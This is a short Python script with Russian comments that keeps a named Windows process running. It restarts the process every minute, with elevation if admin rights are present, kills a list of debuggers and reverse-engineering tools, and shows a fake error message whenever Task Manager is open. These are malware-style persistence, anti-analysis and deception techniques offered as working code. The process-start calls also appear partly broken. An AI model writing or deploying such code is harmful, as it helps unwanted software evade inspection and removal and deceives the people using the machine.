import asyncio
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()
root.withdraw()

process_name = "example.exe"  # имя процесса, который нужно проверить
process_file_path = "C:\\Path\\To\\Process\\File\\example.exe"  # путь к файлу процесса

debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe', 'idaw.exe', 'immunitydebugger.exe']

async def check_and_restart_process():
    while True:
        # проверяем, работает ли процесс
        result = subprocess.run(["tasklist"], stdout=subprocess.PIPE)
        output = result.stdout.decode("utf-8").strip()
        if process_name not in output:
            # если процесс не работает, то пытаемся его перезапустить
            try:
                # проверяем, запущен ли скрипт от имени администратора
                if ctypes.windll.shell32.IsUserAnAdmin():
                    # если запущен, то перезапускаем процесс от имени администратора
                    subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
                else:
                    # если не запущен, то перезапускаем процесс обычным способом
                    subprocess.run([process_file_path])
            except Exception as e:
                print(f"Не удалось запустить процесс: {e}")
        else:
            print("Процесс уже работает")
        for debugger in debuggers:
            if debugger in output:
                subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
        if 'taskmgr.exe' in output:
            messagebox.showerror("Ошибка", "Не удается открыть файл Taskmgr.exe. Код ошибки 0x000000FF. Пожалуйста, попробуйте удалить и заново установить программу, либо обратитесь к специалисту за помощью.")

        await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой

asyncio.run(check_and_restart_process())
